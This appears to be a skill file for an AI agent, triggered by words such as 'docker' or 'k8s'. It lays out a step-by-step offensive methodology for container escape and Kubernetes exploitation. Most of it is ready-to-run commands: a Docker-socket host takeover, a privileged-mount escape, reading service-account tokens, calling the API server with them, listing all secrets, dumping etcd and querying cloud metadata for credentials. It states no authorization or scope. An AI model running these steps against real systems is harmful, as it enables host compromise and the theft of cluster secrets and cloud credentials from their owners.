# SKILL: Container and Kubernetes Security

## Description
Container escape, Kubernetes cluster exploitation, and Docker security assessment.

## Trigger Phrases
docker, container, kubernetes, k8s, pod, escape, container breakout, helm, etcd

## Methodology

### Phase 1: Container Recon
1. Detect container: `cat /proc/1/cgroup`, `ls /.dockerenv`
2. Check capabilities: `capsh --print`
3. Check mounts: `mount`, `fdisk -l`
4. Check network: `ip addr`, `cat /etc/hosts`
5. Check for Docker socket: `ls -la /var/run/docker.sock`

### Phase 2: Container Escape
1. **Docker socket mount**: `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host`
2. **Privileged container**: `mount /dev/sda1 /mnt && chroot /mnt`
3. **CAP_SYS_ADMIN**: mount cgroup escape
4. **CVE-2019-5736**: runc exploit
5. **Kernel exploits**: If kernel is shared and vulnerable

### Phase 3: Kubernetes Exploitation
1. Check service account: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
2. API server access: `curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN"`
3. Enumerate secrets: `kubectl get secrets --all-namespaces`
4. Check RBAC: `kubectl auth can-i --list`
5. Etcd access: `etcdctl get / --prefix --keys-only`

### Phase 4: Lateral Movement
1. Pod-to-pod via service mesh
2. Node access via hostPID/hostNetwork
3. Cloud metadata from pods: `curl http://169.254.169.254/latest/meta-data/`
